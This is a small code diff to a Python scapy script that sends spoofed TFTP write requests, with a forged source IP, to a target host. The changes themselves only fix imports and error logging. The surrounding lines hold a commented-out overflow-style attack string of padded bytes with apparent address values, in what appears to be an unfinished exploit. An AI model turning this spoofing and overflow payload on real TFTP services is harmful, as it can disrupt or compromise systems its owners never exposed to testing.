@@ -12,7 +12,7 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     #attackString = bytearray.fromhex("6c 6d 63 6f 64 65 6d 6f 2e 68 74 6d 2e 73 69 67 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c  6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c 6c e0 6d 1b c0 ec c8 01 c0 00").decode()
 
     a = scapy.IP(src=hostIP,dst=targetIP)
-    b = a/scapy.UDP(sport=RandShort(),dport=TFTPPort)
+    b = a/scapy.UDP(sport=scapy.RandShort(),dport=TFTPPort)
     c = b/scapy.TFTP(op=2)
 
     # Send something friendly for now.
@@ -22,7 +22,7 @@ def spoofTFTP(hostIP, targetIP, TFTPPort):
     d.show()
     print (d)
     print ("Sending...")
-    r = sr1(d, timeout=3, verbose=True)
+    r = scapy.sr1(d, timeout=3, verbose=True)
     print ("Response is")
     print (r)
     # Much more to do here ..
@@ -53,6 +53,6 @@ if __name__ == '__main__':
 
     try:
         spoofTFTP (sys.argv[2], sys.argv[3], int(sys.argv[4]))
-    except:
-        print ("\n<INVALID>: Failed to spoof TFTP\n")
+    except Exception as exc:
+        errorAndLog ("Failed to spoof TFTP", exc=exc, doPrint=False)
     exit (0)
